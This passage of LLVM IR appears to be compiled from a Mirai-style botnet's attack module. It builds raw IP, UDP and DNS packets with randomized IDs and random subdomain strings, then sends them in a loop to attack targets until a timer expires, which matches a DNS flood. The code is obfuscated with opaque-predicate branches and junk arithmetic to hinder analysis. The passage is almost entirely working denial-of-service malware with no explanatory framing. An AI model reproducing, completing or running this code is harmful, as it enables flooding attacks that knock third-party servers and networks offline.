  %293 = sext i32 %291 to i64
  %294 = getelementptr inbounds i8, i8* %292, i64 %293
  store i8* %294, i8** %32, align 8
  %295 = load i8*, i8** %32, align 8
  store i8* %295, i8** %33, align 8
  %296 = load i8*, i8** %32, align 8
  %297 = getelementptr inbounds i8, i8* %296, i64 1
  %298 = load i8*, i8** %22, align 8
  %299 = load i32, i32* %23, align 4
  %300 = add nsw i32 %299, 1
  call void @util_memcpy(i8* %297, i8* %298, i32 %300)
  store i32 0, i32* %26, align 4
  br label %301

; <label>:301:                                    ; preds = %359, %248
  %302 = load i32, i32* %26, align 4
  %303 = load i32, i32* %23, align 4
  %304 = icmp slt i32 %302, %303
  br i1 %304, label %305, label %362

; <label>:305:                                    ; preds = %301
  %306 = load i32, i32* @x.33
  %307 = load i32, i32* @y.34
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %305
  %314 = load i8*, i8** %22, align 8
  %315 = load i32, i32* %26, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds i8, i8* %314, i64 %316
  %318 = load i8, i8* %317, align 1
  %319 = sext i8 %318 to i32
  %320 = icmp eq i32 %319, 46
  %321 = load i32, i32* @x.33
  %322 = load i32, i32* @y.34
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br i1 %320, label %329, label %355

; <label>:329:                                    ; preds = %originalBBpart282
  %330 = load i32, i32* @x.33
  %331 = load i32, i32* @y.34
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %329
  %338 = load i8, i8* %27, align 1
  %339 = load i8*, i8** %33, align 8
  store i8 %338, i8* %339, align 1
  store i8 0, i8* %27, align 1
  %340 = load i8, i8* %28, align 1
  %341 = add i8 %340, 1
  store i8 %341, i8* %28, align 1
  %342 = load i8*, i8** %32, align 8
  %343 = load i32, i32* %26, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds i8, i8* %342, i64 %344
  %346 = getelementptr inbounds i8, i8* %345, i64 1
  store i8* %346, i8** %33, align 8
  %347 = load i32, i32* @x.33
  %348 = load i32, i32* @y.34
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart296, label %originalBB84alteredBB

originalBBpart296:                                ; preds = %originalBB84
  br label %358

; <label>:355:                                    ; preds = %originalBBpart282
  %356 = load i8, i8* %27, align 1
  %357 = add i8 %356, 1
  store i8 %357, i8* %27, align 1
  br label %358

; <label>:358:                                    ; preds = %355, %originalBBpart296
  br label %359

; <label>:359:                                    ; preds = %358
  %360 = load i32, i32* %26, align 4
  %361 = add nsw i32 %360, 1
  store i32 %361, i32* %26, align 4
  br label %301

; <label>:362:                                    ; preds = %301
  %363 = load i8, i8* %27, align 1
  %364 = load i8*, i8** %33, align 8
  store i8 %363, i8* %364, align 1
  %365 = load i8*, i8** %32, align 8
  %366 = load i32, i32* %23, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds i8, i8* %365, i64 %367
  %369 = getelementptr inbounds i8, i8* %368, i64 2
  %370 = bitcast i8* %369 to %struct.grehdr*
  store %struct.grehdr* %370, %struct.grehdr** %34, align 8
  %371 = call zeroext i16 @htons(i16 zeroext 1) #7
  %372 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %373 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %372, i32 0, i32 0
  store i16 %371, i16* %373, align 2
  %374 = call zeroext i16 @htons(i16 zeroext 1) #7
  %375 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %376 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %375, i32 0, i32 1
  store i16 %374, i16* %376, align 2
  br label %377

; <label>:377:                                    ; preds = %362
  %378 = load i32, i32* @x.33
  %379 = load i32, i32* @y.34
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %377
  %386 = load i32, i32* %11, align 4
  %387 = add nsw i32 %386, 1
  store i32 %387, i32* %11, align 4
  %388 = load i32, i32* @x.33
  %389 = load i32, i32* @y.34
  %390 = sub i32 %388, 1
  %391 = mul i32 %388, %390
  %392 = urem i32 %391, 2
  %393 = icmp eq i32 %392, 0
  %394 = icmp slt i32 %389, 10
  %395 = or i1 %393, %394
  br i1 %395, label %originalBBpart2110, label %originalBB98alteredBB

originalBBpart2110:                               ; preds = %originalBB98
  br label %136

; <label>:396:                                    ; preds = %originalBBpart28
  %397 = load i32, i32* @x.33
  %398 = load i32, i32* @y.34
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %396
  %405 = load i32, i32* @x.33
  %406 = load i32, i32* @y.34
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
  %409 = urem i32 %408, 2
  %410 = icmp eq i32 %409, 0
  %411 = icmp slt i32 %406, 10
  %412 = or i1 %410, %411
  br i1 %412, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %413

; <label>:413:                                    ; preds = %originalBBpart2150, %originalBBpart2114
  store i32 0, i32* %11, align 4
  br label %414

; <label>:414:                                    ; preds = %596, %413
  %415 = load i32, i32* %11, align 4
  %416 = load i8, i8* %7, align 1
  %417 = zext i8 %416 to i32
  %418 = icmp slt i32 %415, %417
  br i1 %418, label %419, label %599

; <label>:419:                                    ; preds = %414
  %420 = load i8**, i8*** %13, align 8
  %421 = load i32, i32* %11, align 4
  %422 = sext i32 %421 to i64
  %423 = getelementptr inbounds i8*, i8** %420, i64 %422
  %424 = load i8*, i8** %423, align 8
  store i8* %424, i8** %35, align 8
  %425 = load i8*, i8** %35, align 8
  %426 = bitcast i8* %425 to %struct.iphdr*
  store %struct.iphdr* %426, %struct.iphdr** %36, align 8
  %427 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i64 1
  %429 = bitcast %struct.iphdr* %428 to %struct.udphdr*
  store %struct.udphdr* %429, %struct.udphdr** %37, align 8
  %430 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %431 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %430, i64 1
  %432 = bitcast %struct.udphdr* %431 to %struct.dnshdr*
  store %struct.dnshdr* %432, %struct.dnshdr** %38, align 8
  %433 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %434 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %433, i64 1
  %435 = bitcast %struct.dnshdr* %434 to i8*
  %436 = getelementptr inbounds i8, i8* %435, i64 1
  store i8* %436, i8** %39, align 8
  %437 = load i16, i16* %15, align 2
  %438 = zext i16 %437 to i32
  %439 = icmp eq i32 %438, 65535
  br i1 %439, label %440, label %462

; <label>:440:                                    ; preds = %419
  %441 = load i32, i32* @x.33
  %442 = load i32, i32* @y.34
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %440
  %449 = call i32 @rand_next()
  %450 = and i32 %449, 65535
  %451 = trunc i32 %450 to i16
  %452 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 3
  store i16 %451, i16* %453, align 4
  %454 = load i32, i32* @x.33
  %455 = load i32, i32* @y.34
  %456 = sub i32 %454, 1
  %457 = mul i32 %454, %456
  %458 = urem i32 %457, 2
  %459 = icmp eq i32 %458, 0
  %460 = icmp slt i32 %455, 10
  %461 = or i1 %459, %460
  br i1 %461, label %originalBBpart2120, label %originalBB116alteredBB

originalBBpart2120:                               ; preds = %originalBB116
  br label %462

; <label>:462:                                    ; preds = %originalBBpart2120, %419
  %463 = load i16, i16* %18, align 2
  %464 = zext i16 %463 to i32
  %465 = icmp eq i32 %464, 65535
  br i1 %465, label %466, label %488

; <label>:466:                                    ; preds = %462
  %467 = load i32, i32* @x.33
  %468 = load i32, i32* @y.34
  %469 = sub i32 %467, 1
  %470 = mul i32 %467, %469
  %471 = urem i32 %470, 2
  %472 = icmp eq i32 %471, 0
  %473 = icmp slt i32 %468, 10
  %474 = or i1 %472, %473
  br i1 %474, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %466
  %475 = call i32 @rand_next()
  %476 = and i32 %475, 65535
  %477 = trunc i32 %476 to i16
  %478 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %479 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %478, i32 0, i32 0
  store i16 %477, i16* %479, align 2
  %480 = load i32, i32* @x.33
  %481 = load i32, i32* @y.34
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBBpart2126, label %originalBB122alteredBB

originalBBpart2126:                               ; preds = %originalBB122
  br label %488

; <label>:488:                                    ; preds = %originalBBpart2126, %462
  %489 = load i16, i16* %19, align 2
  %490 = zext i16 %489 to i32
  %491 = icmp eq i32 %490, 65535
  br i1 %491, label %492, label %498

; <label>:492:                                    ; preds = %488
  %493 = call i32 @rand_next()
  %494 = and i32 %493, 65535
  %495 = trunc i32 %494 to i16
  %496 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %497 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %496, i32 0, i32 1
  store i16 %495, i16* %497, align 2
  br label %498

; <label>:498:                                    ; preds = %492, %488
  %499 = load i16, i16* %20, align 2
  %500 = zext i16 %499 to i32
  %501 = icmp eq i32 %500, 65535
  br i1 %501, label %502, label %524

; <label>:502:                                    ; preds = %498
  %503 = load i32, i32* @x.33
  %504 = load i32, i32* @y.34
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %502
  %511 = call i32 @rand_next()
  %512 = and i32 %511, 65535
  %513 = trunc i32 %512 to i16
  %514 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %515 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %514, i32 0, i32 0
  store i16 %513, i16* %515, align 2
  %516 = load i32, i32* @x.33
  %517 = load i32, i32* @y.34
  %518 = sub i32 %516, 1
  %519 = mul i32 %516, %518
  %520 = urem i32 %519, 2
  %521 = icmp eq i32 %520, 0
  %522 = icmp slt i32 %517, 10
  %523 = or i1 %521, %522
  br i1 %523, label %originalBBpart2142, label %originalBB128alteredBB

originalBBpart2142:                               ; preds = %originalBB128
  br label %524

; <label>:524:                                    ; preds = %originalBBpart2142, %498
  %525 = load i8*, i8** %39, align 8
  %526 = load i8, i8* %21, align 1
  %527 = zext i8 %526 to i32
  call void @rand_alphastr(i8* %525, i32 %527)
  %528 = load i8*, i8** %39, align 8
  %529 = load i8, i8* %21, align 1
  %530 = zext i8 %529 to i64
  %531 = getelementptr inbounds i8, i8* %528, i64 %530
  store i8 0, i8* %531, align 1
  %532 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 0, i16* %533, align 2
  %534 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %535 = bitcast %struct.iphdr* %534 to i16*
  %536 = call zeroext i16 @checksum_generic(i16* %535, i32 20)
  %537 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  %539 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %540 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %539, i32 0, i32 3
  store i16 0, i16* %540, align 2
  %541 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %542 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %543 = bitcast %struct.udphdr* %542 to i8*
  %544 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %545 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %544, i32 0, i32 2
  %546 = load i16, i16* %545, align 2
  %547 = load i8, i8* %21, align 1
  %548 = zext i8 %547 to i64
  %549 = add i64 21, %548
  %550 = add i64 %549, 2
  %551 = load i32, i32* %23, align 4
  %552 = sext i32 %551 to i64
  %553 = add i64 %550, %552
  %554 = add i64 %553, 4
  %555 = trunc i64 %554 to i32
  %556 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %541, i8* %543, i16 zeroext %546, i32 %555)
  %557 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %558 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %557, i32 0, i32 3
  store i16 %556, i16* %558, align 2
  %559 = load i32, i32* %24, align 4
  %560 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %561 = load i32, i32* %11, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %560, i64 %562
  %564 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %563, i32 0, i32 0
  %565 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %564, i32 0, i32 2
  %566 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %565, i32 0, i32 0
  store i32 %559, i32* %566, align 4
  %567 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %568 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %567, i32 0, i32 1
  %569 = load i16, i16* %568, align 2
  %570 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %571 = load i32, i32* %11, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %573, i32 0, i32 0
  %575 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %574, i32 0, i32 1
  store i16 %569, i16* %575, align 2
  %576 = load i32, i32* %12, align 4
  %577 = load i8*, i8** %35, align 8
  %578 = load i8, i8* %21, align 1
  %579 = zext i8 %578 to i64
  %580 = add i64 41, %579
  %581 = add i64 %580, 2
  %582 = load i32, i32* %23, align 4
  %583 = sext i32 %582 to i64
  %584 = add i64 %581, %583
  %585 = add i64 %584, 4
  %586 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %587 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %588 = load i32, i32* %11, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %587, i64 %589
  %591 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %590, i32 0, i32 0
  %592 = bitcast %struct.sockaddr_in* %591 to %struct.sockaddr*
  store %struct.sockaddr* %592, %struct.sockaddr** %586, align 8
  %593 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %594 = load %struct.sockaddr*, %struct.sockaddr** %593, align 8
  %595 = call i64 @sendto(i32 %576, i8* %577, i64 %585, i32 16384, %struct.sockaddr* %594, i32 16)
  br label %596

; <label>:596:                                    ; preds = %524
  %597 = load i32, i32* %11, align 4
  %598 = add nsw i32 %597, 1
  store i32 %598, i32* %11, align 4
  br label %414

; <label>:599:                                    ; preds = %414
  %600 = call i64 @time(i64* null) #6
  %601 = load i32, i32* %25, align 4
  %602 = sext i32 %601 to i64
  %603 = icmp sgt i64 %600, %602
  br i1 %603, label %604, label %621

; <label>:604:                                    ; preds = %599
  %605 = load i32, i32* @x.33
  %606 = load i32, i32* @y.34
  %607 = sub i32 %605, 1
  %608 = mul i32 %605, %607
  %609 = urem i32 %608, 2
  %610 = icmp eq i32 %609, 0
  %611 = icmp slt i32 %606, 10
  %612 = or i1 %610, %611
  br i1 %612, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %604
  %613 = load i32, i32* @x.33
  %614 = load i32, i32* @y.34
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br label %638

; <label>:621:                                    ; preds = %599
  %622 = load i32, i32* @x.33
  %623 = load i32, i32* @y.34
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %621
  %630 = load i32, i32* @x.33
  %631 = load i32, i32* @y.34
  %632 = sub i32 %630, 1
  %633 = mul i32 %630, %632
  %634 = urem i32 %633, 2
  %635 = icmp eq i32 %634, 0
  %636 = icmp slt i32 %631, 10
  %637 = or i1 %635, %636
  br i1 %637, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br label %413

; <label>:638:                                    ; preds = %originalBBpart2146, %132, %110, %88
  %639 = load i32, i32* @x.33
  %640 = load i32, i32* @y.34
  %641 = sub i32 %639, 1
  %642 = mul i32 %639, %641
  %643 = urem i32 %642, 2
  %644 = icmp eq i32 %643, 0
  %645 = icmp slt i32 %640, 10
  %646 = or i1 %644, %645
  br i1 %646, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %638
  %647 = load i32, i32* @x.33
  %648 = load i32, i32* @y.34
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %89
  %655 = load i8*, i8** %22, align 8
  %656 = call i32 @util_strlen(i8* %655)
  store i32 %656, i32* %23, align 4
  %657 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %657, i32* %12, align 4
  %658 = icmp eq i32 %657, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %111
  store i32 1, i32* %11, align 4
  %659 = load i32, i32* %12, align 4
  %660 = bitcast i32* %11 to i8*
  %661 = call i32 @setsockopt(i32 %659, i32 0, i32 3, i8* %660, i32 4) #6
  %662 = icmp eq i32 %661, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %136
  %663 = load i32, i32* %11, align 4
  %664 = load i8, i8* %7, align 1
  %665 = zext i8 %664 to i32
  %666 = icmp slt i32 %663, %665
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %157
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %667 = call noalias i8* @calloc(i64 600, i64 1) #6
  %668 = load i8**, i8*** %13, align 8
  %669 = load i32, i32* %11, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds i8*, i8** %668, i64 %670
  store i8* %667, i8** %671, align 8
  %672 = load i8**, i8*** %13, align 8
  %673 = load i32, i32* %11, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds i8*, i8** %672, i64 %674
  %676 = load i8*, i8** %675, align 8
  %677 = bitcast i8* %676 to %struct.iphdr*
  store %struct.iphdr* %677, %struct.iphdr** %29, align 8
  %678 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %679 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %678, i64 1
  %680 = bitcast %struct.iphdr* %679 to %struct.udphdr*
  store %struct.udphdr* %680, %struct.udphdr** %30, align 8
  %681 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %682 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %681, i64 1
  %683 = bitcast %struct.udphdr* %682 to %struct.dnshdr*
  store %struct.dnshdr* %683, %struct.dnshdr** %31, align 8
  %684 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %685 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %684, i64 1
  %686 = bitcast %struct.dnshdr* %685 to i8*
  store i8* %686, i8** %32, align 8
  %687 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %688 = bitcast %struct.iphdr* %687 to i8*
  %689 = load i8, i8* %688, align 4
  %_ = shl i8 %689, 15
  %_11 = shl i8 %689, 15
  %_12 = shl i8 %689, 15
  %_13 = shl i8 %689, 15
  %_14 = sub i8 %689, 15
  %gen = mul i8 %_14, 15
  %_15 = sub i8 0, %689
  %gen16 = add i8 %_15, 15
  %_17 = sub i8 %689, 15
  %gen18 = mul i8 %_17, 15
  %_19 = shl i8 %689, 15
  %690 = and i8 %689, 15
  %_20 = sub i8 %690, 64
  %gen21 = mul i8 %_20, 64
  %_22 = sub i8 %690, 64
  %gen23 = mul i8 %_22, 64
  %_24 = sub i8 %690, 64
  %gen25 = mul i8 %_24, 64
  %_26 = sub i8 %690, 64
  %gen27 = mul i8 %_26, 64
  %_28 = sub i8 %690, 64
  %gen29 = mul i8 %_28, 64
  %691 = or i8 %690, 64
  store i8 %691, i8* %688, align 4
  %692 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %693 = bitcast %struct.iphdr* %692 to i8*
  %694 = load i8, i8* %693, align 4
  %_30 = sub i8 0, %694
  %gen31 = add i8 %_30, -16
  %_32 = sub i8 %694, -16
  %gen33 = mul i8 %_32, -16
  %_34 = shl i8 %694, -16
  %_35 = sub i8 0, %694
  %gen36 = add i8 %_35, -16
  %695 = and i8 %694, -16
  %_37 = shl i8 %695, 5
  %_38 = sub i8 0, %695
  %gen39 = add i8 %_38, 5
  %_40 = sub i8 0, %695
  %gen41 = add i8 %_40, 5
  %_42 = sub i8 0, %695
  %gen43 = add i8 %_42, 5
  %_44 = sub i8 0, %695
  %gen45 = add i8 %_44, 5
  %_46 = shl i8 %695, 5
  %696 = or i8 %695, 5
  store i8 %696, i8* %693, align 4
  %697 = load i8, i8* %14, align 1
  %698 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %699 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %698, i32 0, i32 1
  store i8 %697, i8* %699, align 1
  %700 = load i8, i8* %21, align 1
  %701 = zext i8 %700 to i64
  %_47 = sub i64 0, 41
  %gen48 = add i64 %_47, %701
  %_49 = shl i64 41, %701
  %702 = add i64 41, %701
  %703 = add i64 %702, 2
  %704 = load i32, i32* %23, align 4
  %705 = sext i32 %704 to i64
  %_50 = shl i64 %703, %705
  %_51 = sub i64 %703, %705
  %gen52 = mul i64 %_51, %705
  %_53 = sub i64 0, %703
  %gen54 = add i64 %_53, %705
  %_55 = sub i64 %703, %705
  %gen56 = mul i64 %_55, %705
  %_57 = sub i64 %703, %705
  %gen58 = mul i64 %_57, %705
  %_59 = sub i64 %703, %705
  %gen60 = mul i64 %_59, %705
  %706 = add i64 %703, %705
  %_61 = sub i64 0, %706
  %gen62 = add i64 %_61, 4
  %_63 = shl i64 %706, 4
  %_64 = sub i64 0, %706
  %gen65 = add i64 %_64, 4
  %_66 = sub i64 %706, 4
  %gen67 = mul i64 %_66, 4
  %_68 = shl i64 %706, 4
  %_69 = sub i64 %706, 4
  %gen70 = mul i64 %_69, 4
  %_71 = sub i64 %706, 4
  %gen72 = mul i64 %_71, 4
  %707 = add i64 %706, 4
  %708 = trunc i64 %707 to i16
  %709 = call zeroext i16 @htons(i16 zeroext %708) #7
  %710 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %711 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %710, i32 0, i32 2
  store i16 %709, i16* %711, align 2
  %712 = load i16, i16* %15, align 2
  %713 = call zeroext i16 @htons(i16 zeroext %712) #7
  %714 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %715 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %714, i32 0, i32 3
  store i16 %713, i16* %715, align 4
  %716 = load i8, i8* %16, align 1
  %717 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %718 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %717, i32 0, i32 5
  store i8 %716, i8* %718, align 4
  %719 = load i8, i8* %17, align 1
  %720 = icmp ne i8 %719, 0
  br label %originalBB10

originalBB76alteredBB:                            ; preds = %originalBB76, %228
  %721 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %722 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %723 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %722, i32 0, i32 4
  store i16 %721, i16* %723, align 2
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %305
  %724 = load i8*, i8** %22, align 8
  %725 = load i32, i32* %26, align 4
  %726 = sext i32 %725 to i64
  %727 = getelementptr inbounds i8, i8* %724, i64 %726
  %728 = load i8, i8* %727, align 1
  %729 = sext i8 %728 to i32
  %730 = icmp eq i32 %729, 46
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %329
  %731 = load i8, i8* %27, align 1
  %732 = load i8*, i8** %33, align 8
  store i8 %731, i8* %732, align 1
  store i8 0, i8* %27, align 1
  %733 = load i8, i8* %28, align 1
  %_85 = sub i8 %733, 1
  %gen86 = mul i8 %_85, 1
  %_87 = shl i8 %733, 1
  %_88 = sub i8 0, %733
  %gen89 = add i8 %_88, 1
  %_90 = sub i8 %733, 1
  %gen91 = mul i8 %_90, 1
  %_92 = shl i8 %733, 1
  %_93 = shl i8 %733, 1
  %_94 = shl i8 %733, 1
  %734 = add i8 %733, 1
  store i8 %734, i8* %28, align 1
  %735 = load i8*, i8** %32, align 8
  %736 = load i32, i32* %26, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds i8, i8* %735, i64 %737
  %739 = getelementptr inbounds i8, i8* %738, i64 1
  store i8* %739, i8** %33, align 8
  br label %originalBB84

originalBB98alteredBB:                            ; preds = %originalBB98, %377
  %740 = load i32, i32* %11, align 4
  %_99 = sub i32 0, %740
  %gen100 = add i32 %_99, 1
  %_101 = shl i32 %740, 1
  %_102 = shl i32 %740, 1
  %_103 = shl i32 %740, 1
  %_104 = sub i32 %740, 1
  %gen105 = mul i32 %_104, 1
  %_106 = shl i32 %740, 1
  %_107 = sub i32 0, %740
  %gen108 = add i32 %_107, 1
  %741 = add nsw i32 %740, 1
  store i32 %741, i32* %11, align 4
  br label %originalBB98

originalBB112alteredBB:                           ; preds = %originalBB112, %396
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %440
  %742 = call i32 @rand_next()
  %_117 = shl i32 %742, 65535
  %_118 = shl i32 %742, 65535
  %743 = and i32 %742, 65535
  %744 = trunc i32 %743 to i16
  %745 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %746 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %745, i32 0, i32 3
  store i16 %744, i16* %746, align 4
  br label %originalBB116

originalBB122alteredBB:                           ; preds = %originalBB122, %466
  %747 = call i32 @rand_next()
  %_123 = sub i32 %747, 65535
  %gen124 = mul i32 %_123, 65535
  %748 = and i32 %747, 65535
  %749 = trunc i32 %748 to i16
  %750 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %751 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %750, i32 0, i32 0
  store i16 %749, i16* %751, align 2
  br label %originalBB122

originalBB128alteredBB:                           ; preds = %originalBB128, %502
  %752 = call i32 @rand_next()
  %_129 = shl i32 %752, 65535
  %_130 = sub i32 %752, 65535
  %gen131 = mul i32 %_130, 65535
  %_132 = sub i32 0, %752
  %gen133 = add i32 %_132, 65535
  %_134 = sub i32 %752, 65535
  %gen135 = mul i32 %_134, 65535
  %_136 = sub i32 0, %752
  %gen137 = add i32 %_136, 65535
  %_138 = shl i32 %752, 65535
  %_139 = sub i32 0, %752
  %gen140 = add i32 %_139, 65535
  %753 = and i32 %752, 65535
  %754 = trunc i32 %753 to i16
  %755 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
